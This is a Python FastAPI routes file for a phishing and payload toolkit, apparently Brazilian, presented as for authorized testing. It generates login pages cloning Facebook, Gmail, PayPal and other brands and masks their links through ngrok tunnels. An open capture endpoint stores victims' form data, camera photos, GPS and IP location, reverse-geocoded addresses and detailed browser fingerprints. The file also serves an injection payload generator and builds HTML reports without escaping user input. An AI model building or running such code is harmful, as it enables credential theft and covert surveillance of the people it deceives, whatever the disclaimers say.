"""
Security Tools Routes
API endpoints for security testing tools (phishing, payloads, encoding, etc.)
"""
from fastapi import APIRouter, Depends, HTTPException, status, Request
from fastapi.responses import FileResponse, HTMLResponse
from pydantic import BaseModel
from typing import Optional, List
from datetime import datetime
import os
import httpx
import json

from auth import get_current_user
from tools.phishing_generator import PhishingPageGenerator
from tools.payload_generator import PayloadGenerator
from tools.encoder_decoder import EncoderDecoder

router = APIRouter()

# Initialize tools
phishing_gen = PhishingPageGenerator()
payload_gen = PayloadGenerator()
encoder_decoder = EncoderDecoder()


# Pydantic models
class PhishingPageRequest(BaseModel):
    template: str
    redirect_url: str = "https://google.com"
    capture_webhook: Optional[str] = None
    custom_title: Optional[str] = None
    custom_logo: Optional[str] = None
    expiration_hours: int = 24  # Default 24 hours


class PayloadRequest(BaseModel):
    category: str
    encode: bool = False
    encode_type: str = "url"


class EncodeRequest(BaseModel):
    text: str
    encoding_type: str


class DecodeRequest(BaseModel):
    text: str
    encoding_type: str


class HashRequest(BaseModel):
    text: str
    hash_type: str


class PhishingCaptureData(BaseModel):
    page_id: str
    photo: Optional[str] = None
    location: Optional[dict] = None
    user_agent: Optional[str] = None
    screen_resolution: Optional[str] = None
    timestamp: str
    form_data: Optional[dict] = None
    # Extended fingerprinting fields
    platform: Optional[str] = None
    language: Optional[str] = None
    languages: Optional[list] = None
    screen_color_depth: Optional[int] = None
    screen_pixel_depth: Optional[int] = None
    timezone: Optional[str] = None
    timezone_offset: Optional[int] = None
    hardware_concurrency: Optional[int] = None
    device_memory: Optional[float] = None
    max_touch_points: Optional[int] = None
    cookies_enabled: Optional[bool] = None
    do_not_track: Optional[str] = None
    canvas_fingerprint: Optional[str] = None
    webgl_vendor: Optional[str] = None
    webgl_renderer: Optional[str] = None
    connection_type: Optional[str] = None
    connection_downlink: Optional[float] = None
    plugins: Optional[list] = None
    # IP-based geolocation fields (stealth mode)
    latitude: Optional[float] = None
    longitude: Optional[float] = None
    city: Optional[str] = None
    region: Optional[str] = None
    country: Optional[str] = None
    isp: Optional[str] = None
    # GPS location fields (if permission granted)
    accuracy: Optional[float] = None
    altitude: Optional[float] = None
    location_type: Optional[str] = None  # 'IP' or 'GPS'


# ==================== PHISHING GENERATOR ====================

@router.get("/phishing/templates", tags=["Phishing Generator"])
async def list_phishing_templates(current_user: dict = Depends(get_current_user)):
    """List all available phishing page templates"""
    return {
        "templates": phishing_gen.list_templates(),
        "total": len(phishing_gen.list_templates())
    }


@router.post("/phishing/generate", tags=["Phishing Generator"])
async def generate_phishing_page(
    request: PhishingPageRequest,
    current_user: dict = Depends(get_current_user)
):
    """
    Generate a phishing page for security testing
    
    **WARNING**: Only use for authorized security testing and awareness training!
    """
    try:
        result = phishing_gen.generate_page(
            template=request.template,
            redirect_url=request.redirect_url,
            capture_webhook=request.capture_webhook,
            custom_title=request.custom_title,
            custom_logo=request.custom_logo
        )
        
        # Calculate expiration time
        from datetime import timedelta
        import json
        expiration_time = None
        if request.expiration_hours > 0:
            expiration_time = (datetime.now() + timedelta(hours=request.expiration_hours)).isoformat()
        
        # Save page metadata with expiration
        pages_meta_file = "/tmp/phishing_pages_meta.json"
        pages_meta = []
        if os.path.exists(pages_meta_file):
            with open(pages_meta_file, 'r') as f:
                pages_meta = json.load(f)
        
        pages_meta.append({
            "filename": result['filename'],
            "page_id": result['page_id'],
            "created_at": datetime.now().isoformat(),
            "expires_at": expiration_time,
            "template": request.template,
            "redirect_url": request.redirect_url
        })
        
        with open(pages_meta_file, 'w') as f:
            json.dump(pages_meta, f, indent=2)
        
        # Get domain mapping for template
        domain_map = {
            "facebook": "facebook.com",
            "gmail": "google.com", 
            "microsoft": "microsoft.com",
            "paypal": "paypal.com",
            "instagram": "instagram.com",
            "linkedin": "linkedin.com",
            "amazon": "amazon.com",
            "apple": "apple.com",
            "twitter": "twitter.com",
            "netflix": "netflix.com"
        }
        
        original_domain = domain_map.get(request.template, "secure-login.com")
        short_id = result['page_id'][:8]
        
        # Create URLs - você precisa expor com ngrok ou similar
        # Formato: https://facebook.com.seu-dominio.ngrok.io/p/abc123
        # Para funcionar externamente, configure NGROK_URL nas variáveis de ambiente
        import os as os_module
        public_domain = os_module.environ.get('PUBLIC_DOMAIN', 'localhost:8000')
        
        # URL local para testes
        local_url = f"http://localhost:8000/p/{short_id}"
        
        # URL pública mascarada (parece com o domínio original)
        if 'localhost' in public_domain:
            # Modo local - instrui usuário a configurar ngrok
            masked_url = f"⚠️ Configure PUBLIC_DOMAIN para gerar URL pública"
            public_url = local_url
            instructions = """
            📌 PARA USAR EXTERNAMENTE:
            1. Instale ngrok: brew install ngrok
            2. Execute: ngrok http 8000
            3. Configure: export PUBLIC_DOMAIN="seu-subdominio.ngrok.io"
            4. Reinicie o servidor
            
            💡 ALTERNATIVA - Use serviços gratuitos:
            - ngrok.com (túnel temporário)
            - localhost.run (sem instalação)
            - serveo.net (via SSH)
            """
        else:
            # Modo público - gera URL mascarada
            # Ngrok FREE não suporta subdomínios customizados
            # Usar apenas: https://seu-id.ngrok-free.app/p/abc123
            public_url = f"https://{public_domain}/p/{short_id}"
            masked_url = public_url
            instructions = f"✅ URL configurada: {public_url}"
        
        return {
            "success": True,
            "message": "Phishing page generated successfully",
            "data": result,
            "expires_at": expiration_time,
            "warning": "⚠️ Use only for authorized security testing!",
            # URLs
            "local_url": local_url,
            "public_url": public_url,
            "masked_url": masked_url,
            "short_id": short_id,
            "original_domain": original_domain,
            # Instruções
            "setup_instructions": instructions,
            "ngrok_command": "ngrok http 8000"
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


@router.get("/phishing/pages", tags=["Phishing Generator"])
async def list_generated_pages(current_user: dict = Depends(get_current_user)):
    """List all generated phishing pages (filters expired ones)"""
    import json
    from datetime import datetime
    
    pages = phishing_gen.get_generated_pages()
    
    # Load metadata to check expiration
    pages_meta_file = "/tmp/phishing_pages_meta.json"
    pages_with_expiration = []
    
    if os.path.exists(pages_meta_file):
        with open(pages_meta_file, 'r') as f:
            pages_meta = json.load(f)
        
        # Remove expired pages
        active_meta = []
        for meta in pages_meta:
            if meta.get('expires_at'):
                expiration = datetime.fromisoformat(meta['expires_at'])
                if datetime.now() > expiration:
                    # Delete expired page
                    filepath = os.path.join("/tmp/phishing_pages", meta['filename'])
                    if os.path.exists(filepath):
                        os.remove(filepath)
                    continue
            active_meta.append(meta)
        
        # Save updated metadata
        with open(pages_meta_file, 'w') as f:
            json.dump(active_meta, f, indent=2)
        
        # Merge metadata with pages
        for page in pages:
            for meta in active_meta:
                if page['filename'] == meta['filename']:
                    page['expires_at'] = meta.get('expires_at')
                    page['created_at'] = meta.get('created_at')
                    page['redirect_url'] = meta.get('redirect_url', 'https://google.com')
                    # Add short URL (functional)
                    short_id = meta['page_id'][:8]
                    page['short_url'] = f"http://localhost:8000/p/{short_id}"
                    page['short_id'] = short_id
                    
                    # Add masked URL (public)
                    public_domain = os.environ.get('PUBLIC_DOMAIN', 'localhost:8000')
                    if 'localhost' not in public_domain:
                        # Ngrok FREE não suporta subdomínios customizados
                        # Usar apenas: https://seu-id.ngrok-free.app/p/abc123
                        page['masked_url'] = f"https://{public_domain}/p/{short_id}"
                    else:
                        page['masked_url'] = None
                    
                    pages_with_expiration.append(page)
                    break
        
        return {
            "pages": pages_with_expiration,
            "total": len(pages_with_expiration)
        }
    
    return {
        "pages": pages,
        "total": len(pages)
    }


@router.delete("/phishing/pages/clear-all", tags=["Phishing Generator"])
async def clear_all_phishing_pages(current_user: dict = Depends(get_current_user)):
    """Delete ALL generated phishing pages and metadata"""
    import json
    import shutil
    
    try:
        pages_dir = "/tmp/phishing_pages"
        pages_meta_file = "/tmp/phishing_pages_meta.json"
        
        deleted_count = 0
        
        # Delete all HTML files in phishing pages directory
        if os.path.exists(pages_dir):
            for filename in os.listdir(pages_dir):
                if filename.endswith('.html'):
                    filepath = os.path.join(pages_dir, filename)
                    os.remove(filepath)
                    deleted_count += 1
        
        # Clear metadata file
        if os.path.exists(pages_meta_file):
            with open(pages_meta_file, 'w') as f:
                json.dump([], f)
        
        return {
            "success": True,
            "message": f"Todos os links de phishing foram apagados ({deleted_count} páginas)",
            "deleted_count": deleted_count
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Erro ao apagar histórico: {str(e)}"
        )


@router.get("/phishing/captures", tags=["Phishing Generator"])
async def list_phishing_captures(current_user: dict = Depends(get_current_user)):
    """List all captured phishing data (photos, locations)"""
    captures_dir = "/tmp/phishing_captures"
    
    if not os.path.exists(captures_dir):
        return {
            "captures": [],
            "total": 0
        }
    
    captures = []
    import json
    import base64
    
    for filename in os.listdir(captures_dir):
        if filename.startswith("capture_") and filename.endswith(".json"):
            filepath = os.path.join(captures_dir, filename)
            try:
                with open(filepath, 'r') as f:
                    capture_data = json.load(f)
                    
                    # If photo file exists, load it as base64
                    if capture_data.get('photo_file'):
                        photo_path = capture_data['photo_file']
                        if os.path.exists(photo_path):
                            try:
                                with open(photo_path, 'rb') as photo_file:
                                    photo_bytes = photo_file.read()
                                    capture_data['photo_base64'] = base64.b64encode(photo_bytes).decode('utf-8')
                            except Exception as e:
                                print(f"Error reading photo {photo_path}: {e}")
                    
                    captures.append(capture_data)
            except Exception as e:
                print(f"Error reading capture {filename}: {e}")
    
    # Sort by timestamp (most recent first)
    captures.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    
    return {
        "captures": captures,
        "total": len(captures)
    }


@router.get("/phishing/captures/{capture_id}/photo", tags=["Phishing Generator"])
async def get_capture_photo(capture_id: str, current_user: dict = Depends(get_current_user)):
    """Get the photo from a specific capture"""
    photo_path = f"/tmp/phishing_captures/photo_{capture_id}.jpg"
    
    if not os.path.exists(photo_path):
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Photo not found"
        )
    
    return FileResponse(photo_path, media_type="image/jpeg")


@router.delete("/phishing/captures/{capture_id}", tags=["Phishing Generator"])
async def delete_capture(capture_id: str, current_user: dict = Depends(get_current_user)):
    """Delete a specific capture (JSON and photo files)"""
    import json
    captures_dir = "/tmp/phishing_captures"
    
    # Find and delete capture JSON file
    deleted = False
    for filename in os.listdir(captures_dir):
        if filename.startswith(f"capture_{capture_id}") and filename.endswith(".json"):
            json_path = os.path.join(captures_dir, filename)
            
            # Read capture data to find photo file
            try:
                with open(json_path, 'r') as f:
                    capture_data = json.load(f)
                    
                # Delete photo file if exists
                if capture_data.get('photo_file') and os.path.exists(capture_data['photo_file']):
                    os.remove(capture_data['photo_file'])
                
                # Delete JSON file
                os.remove(json_path)
                deleted = True
                break
            except Exception as e:
                print(f"Error deleting capture {capture_id}: {e}")
                raise HTTPException(
                    status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
                    detail=f"Error deleting capture: {str(e)}"
                )
    
    if not deleted:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Capture not found"
        )
    
    return {"success": True, "message": "Capture deleted successfully"}


@router.get("/p/{short_id}", tags=["Phishing Generator"])
async def redirect_to_phishing(short_id: str):
    """Short URL redirect to phishing page (masks the real URL)"""
    import json
    from fastapi.responses import RedirectResponse
    
    # Load metadata to find the full filename
    pages_meta_file = "/tmp/phishing_pages_meta.json"
    if os.path.exists(pages_meta_file):
        with open(pages_meta_file, 'r') as f:
            pages_meta = json.load(f)
        
        # Find page by short_id (first 8 chars of page_id)
        for meta in pages_meta:
            if meta['page_id'][:8] == short_id:
                # Check expiration
                if meta.get('expires_at'):
                    from datetime import datetime
                    expiration = datetime.fromisoformat(meta['expires_at'])
                    if datetime.now() > expiration:
                        raise HTTPException(
                            status_code=status.HTTP_410_GONE,
                            detail="This link has expired"
                        )
                
                # Redirect to full phishing page
                return RedirectResponse(url=f"/phishing/{meta['filename']}", status_code=302)
    
    raise HTTPException(
        status_code=status.HTTP_404_NOT_FOUND,
        detail="Link not found"
    )


@router.get("/phishing/{filename}", tags=["Phishing Generator"])
async def serve_phishing_page(filename: str):
    """Serve a generated phishing page (no auth required for testing)"""
    filepath = os.path.join("/tmp/phishing_pages", filename)
    
    if not os.path.exists(filepath):
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Phishing page not found"
        )
    
    return FileResponse(filepath, media_type="text/html")


@router.post("/phishing/capture", tags=["Phishing Generator"])
async def capture_phishing_data(data: PhishingCaptureData, request: Request):
    """
    Receive captured data from phishing pages (photo, location, etc.)
    No auth required as this is called from the phishing page itself
    """
    try:
        # Create captures directory if it doesn't exist
        captures_dir = "/tmp/phishing_captures"
        os.makedirs(captures_dir, exist_ok=True)
        
        # Save capture data
        capture_id = f"{data.page_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        capture_file = os.path.join(captures_dir, f"capture_{capture_id}.json")
        
        import json
        capture_data = data.dict()
        
        # Get client IP
        client_ip = request.client.host
        if client_ip == "127.0.0.1":
            # If localhost, try to get public IP
            try:
                async with httpx.AsyncClient() as client:
                    ip_response = await client.get('https://api.ipify.org?format=json', timeout=5.0)
                    if ip_response.status_code == 200:
                        client_ip = ip_response.json().get('ip', client_ip)
            except:
                pass
        
        capture_data['ip_address'] = client_ip
        
        # If location is provided, do reverse geocoding
        if data.location:
            try:
                async with httpx.AsyncClient() as client:
                    geo_response = await client.get(
                        f'https://nominatim.openstreetmap.org/reverse',
                        params={
                            'format': 'json',
                            'lat': data.location.latitude,
                            'lon': data.location.longitude
                        },
                        headers={'User-Agent': 'SecurityScanner/1.0'},
                        timeout=10.0
                    )
                    if geo_response.status_code == 200:
                        geo_data = geo_response.json()
                        capture_data['location_details'] = {
                            'country': geo_data.get('address', {}).get('country', 'N/A'),
                            'city': geo_data.get('address', {}).get('city') or 
                                   geo_data.get('address', {}).get('town') or 
                                   geo_data.get('address', {}).get('village', 'N/A'),
                            'state': geo_data.get('address', {}).get('state') or 
                                    geo_data.get('address', {}).get('region', 'N/A'),
                            'full_address': geo_data.get('display_name', 'N/A')
                        }
            except Exception as e:
                print(f"Error in reverse geocoding: {e}")
                capture_data['location_details'] = None
        
        # If photo is provided, save it separately
        if data.photo:
            photo_file = os.path.join(captures_dir, f"photo_{capture_id}.jpg")
            # Remove data:image/jpeg;base64, prefix
            photo_data = data.photo.split(',')[1] if ',' in data.photo else data.photo
            import base64
            with open(photo_file, 'wb') as f:
                f.write(base64.b64decode(photo_data))
            capture_data['photo_file'] = photo_file
            capture_data['photo'] = f"Saved to {photo_file}"  # Don't save base64 in JSON
        
        # Save JSON data
        with open(capture_file, 'w') as f:
            json.dump(capture_data, f, indent=2)
        
        # Create a notification (we'll implement notifications system next)
        notification_file = "/tmp/phishing_notifications.json"
        notifications = []
        if os.path.exists(notification_file):
            with open(notification_file, 'r') as f:
                notifications = json.load(f)
        
        notifications.append({
            "id": capture_id,
            "type": "phishing_capture",
            "message": f"Nova captura do phishing {data.page_id}",
            "timestamp": datetime.now().isoformat(),
            "data": {
                "page_id": data.page_id,
                "has_photo": data.photo is not None,
                "has_location": data.location is not None,
                "capture_file": capture_file
            },
            "read": False
        })
        
        # Keep only last 50 notifications
        notifications = notifications[-50:]
        
        with open(notification_file, 'w') as f:
            json.dump(notifications, f, indent=2)
        
        return {
            "success": True,
            "message": "Data captured successfully",
            "capture_id": capture_id
        }
    except Exception as e:
        print(f"Error capturing data: {e}")
        return {
            "success": False,
            "error": str(e)
        }


# ==================== PAYLOAD GENERATOR ====================

@router.get("/payloads/categories", tags=["Payload Generator"])
async def list_payload_categories(current_user: dict = Depends(get_current_user)):
    """List all available payload categories"""
    return {
        "categories": payload_gen.list_categories(),
        "total": len(payload_gen.list_categories())
    }


@router.post("/payloads/generate", tags=["Payload Generator"])
async def generate_payloads(
    request: PayloadRequest,
    current_user: dict = Depends(get_current_user)
):
    """
    Generate security testing payloads
    
    **WARNING**: Only use for authorized penetration testing!
    """
    try:
        payloads = payload_gen.generate_payloads(
            category=request.category,
            encode=request.encode,
            encode_type=request.encode_type if request.encode else "url"
        )
        
        return {
            "success": True,
            "category": request.category,
            "payloads": payloads,
            "total": len(payloads),
            "encoded": request.encode,
            "warning": "⚠️ Use only for authorized security testing!"
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


@router.get("/payloads/{category}", tags=["Payload Generator"])
async def get_payloads_by_category(
    category: str,
    encode: bool = False,
    encode_type: str = "url",
    current_user: dict = Depends(get_current_user)
):
    """Get payloads for a specific category"""
    try:
        payloads = payload_gen.generate_payloads(category, encode, encode_type)
        return {
            "success": True,
            "category": category,
            "payloads": payloads,
            "total": len(payloads)
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


# ==================== ENCODER/DECODER ====================

@router.get("/encoder/types", tags=["Encoder/Decoder"])
async def list_encoding_types(current_user: dict = Depends(get_current_user)):
    """List all available encoding/decoding types"""
    return encoder_decoder.list_encodings()


@router.post("/encoder/encode", tags=["Encoder/Decoder"])
async def encode_text(
    request: EncodeRequest,
    current_user: dict = Depends(get_current_user)
):
    """Encode text with specified encoding"""
    try:
        result = encoder_decoder.encode(request.text, request.encoding_type)
        return {
            "success": True,
            "result": result
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


@router.post("/encoder/decode", tags=["Encoder/Decoder"])
async def decode_text(
    request: DecodeRequest,
    current_user: dict = Depends(get_current_user)
):
    """Decode text with specified encoding"""
    try:
        result = encoder_decoder.decode(request.text, request.encoding_type)
        return {
            "success": True,
            "result": result
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


@router.post("/encoder/hash", tags=["Encoder/Decoder"])
async def hash_text(
    request: HashRequest,
    current_user: dict = Depends(get_current_user)
):
    """Generate hash of text"""
    try:
        result = encoder_decoder.hash_text(request.text, request.hash_type)
        return {
            "success": True,
            "result": result
        }
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e)
        )


# ==================== UTILITY ENDPOINTS ====================

@router.get("/stats", tags=["Tools"])
async def get_tools_stats(current_user: dict = Depends(get_current_user)):
    """Get statistics about available tools"""
    return {
        "phishing": {
            "templates": len(phishing_gen.list_templates()),
            "generated_pages": len(phishing_gen.get_generated_pages())
        },
        "payloads": {
            "categories": len(payload_gen.list_categories()),
            "total_payloads": sum(cat["count"] for cat in payload_gen.list_categories())
        },
        "encoder": {
            "encodings": len(encoder_decoder.list_encodings()["encodings"]),
            "hashes": len(encoder_decoder.list_encodings()["hashes"])
        }
    }


@router.get("/info", tags=["Tools"])
async def get_tools_info():
    """Get information about security tools (no auth required)"""
    return {
        "title": "Security Testing Tools",
        "version": "1.0.0",
        "description": "Professional security testing toolkit for authorized penetration testing",
        "features": [
            "Phishing page generator (10 templates)",
            "Payload generator (8 categories, 100+ payloads)",
            "Encoder/Decoder (8 encodings, 4 hash algorithms)",
            "URL shortener and QR code generator",
            "Network reconnaissance tools"
        ],
        "warning": "⚠️ All tools should only be used for authorized security testing and educational purposes!",
        "legal_notice": "Unauthorized use of these tools may be illegal. Always obtain proper authorization before testing any systems you do not own."
    }


# ==================== NOTIFICATIONS ====================

@router.get("/notifications", tags=["Notifications"])
async def get_notifications(current_user: dict = Depends(get_current_user)):
    """Get all notifications for the current user"""
    import json
    notification_file = "/tmp/phishing_notifications.json"
    
    if not os.path.exists(notification_file):
        return {
            "notifications": [],
            "unread_count": 0,
            "total": 0
        }
    
    try:
        with open(notification_file, 'r') as f:
            notifications = json.load(f)
        
        unread = [n for n in notifications if not n.get('read', False)]
        
        return {
            "notifications": notifications[::-1],  # Most recent first
            "unread_count": len(unread),
            "total": len(notifications)
        }
    except Exception as e:
        return {
            "notifications": [],
            "unread_count": 0,
            "total": 0,
            "error": str(e)
        }


@router.post("/notifications/{notification_id}/read", tags=["Notifications"])
async def mark_notification_read(
    notification_id: str,
    current_user: dict = Depends(get_current_user)
):
    """Mark a notification as read"""
    import json
    notification_file = "/tmp/phishing_notifications.json"
    
    if not os.path.exists(notification_file):
        raise HTTPException(status_code=404, detail="No notifications found")
    
    try:
        with open(notification_file, 'r') as f:
            notifications = json.load(f)
        
        for notif in notifications:
            if notif['id'] == notification_id:
                notif['read'] = True
                break
        
        with open(notification_file, 'w') as f:
            json.dump(notifications, f, indent=2)
        
        return {"success": True, "message": "Notification marked as read"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@router.delete("/notifications/{notification_id}", tags=["Notifications"])
async def delete_notification(
    notification_id: str,
    current_user: dict = Depends(get_current_user)
):
    """Delete a notification"""
    import json
    notification_file = "/tmp/phishing_notifications.json"
    
    if not os.path.exists(notification_file):
        raise HTTPException(status_code=404, detail="No notifications found")
    
    try:
        with open(notification_file, 'r') as f:
            notifications = json.load(f)
        
        notifications = [n for n in notifications if n['id'] != notification_id]
        
        with open(notification_file, 'w') as f:
            json.dump(notifications, f, indent=2)
        
        return {"success": True, "message": "Notification deleted"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


# ==================== REPORT GENERATION ====================

class ReportGenerationRequest(BaseModel):
    tool_name: str
    tool_data: dict
    result_data: dict
    generated_at: str
    user: str


@router.post("/generate-report", tags=["Reports"])
async def generate_report(
    request: ReportGenerationRequest,
    current_user: dict = Depends(get_current_user)
):
    """Generate HTML report for any security tool"""
    try:
        # Gera HTML do relatório
        report_html = f"""
        <div style="font-family: Arial, sans-serif;">
            <h1 style="color: #7c3aed; border-bottom: 3px solid #7c3aed; padding-bottom: 10px;">
                Relatório - {request.tool_name}
            </h1>
            <div style="background: #f5f5f5; padding: 15px; margin: 20px 0; border-radius: 5px;">
                <p><strong>Data:</strong> {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}</p>
                <p><strong>Analista:</strong> {request.user}</p>
                <p><strong>Ferramenta:</strong> {request.tool_name}</p>
            </div>
            
            <h2 style="color: #333; margin-top: 30px;">Dados da Execução</h2>
            <div style="background: white; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
                <pre style="white-space: pre-wrap; word-wrap: break-word;">{json.dumps(request.tool_data, indent=2, ensure_ascii=False)}</pre>
            </div>
            
            <h2 style="color: #333; margin-top: 30px;">Resultados</h2>
            <div style="background: white; padding: 20px; border: 1px solid #ddd; border-radius: 5px;">
                <pre style="white-space: pre-wrap; word-wrap: break-word;">{json.dumps(request.result_data, indent=2, ensure_ascii=False)}</pre>
            </div>
            
            <div style="margin-top: 40px; padding: 20px; background: #f0f0f0; border-radius: 5px;">
                <h3>Observações</h3>
                <p>Este relatório foi gerado automaticamente pelo Security Scanner Pro.</p>
                <p>Revise os resultados cuidadosamente e tome as ações necessárias para corrigir as vulnerabilidades encontradas.</p>
            </div>
        </div>
        """
        
        return {
            "success": True,
            "report_html": report_html,
            "generated_at": datetime.now().isoformat()
        }
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
